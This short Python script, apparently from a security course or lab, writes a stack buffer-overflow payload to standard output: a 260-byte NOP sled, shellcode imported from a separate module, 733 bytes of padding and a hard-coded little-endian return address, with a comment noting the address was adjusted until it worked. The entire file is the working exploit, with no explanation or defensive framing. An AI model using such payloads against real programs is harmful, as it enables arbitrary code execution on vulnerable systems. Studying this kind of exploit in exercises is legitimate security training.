from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'\x90'*260)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*733)
sys.stdout.buffer.write(0xfff6e62f.to_bytes(4, 'little')) #this address is probably wrong, should be right now

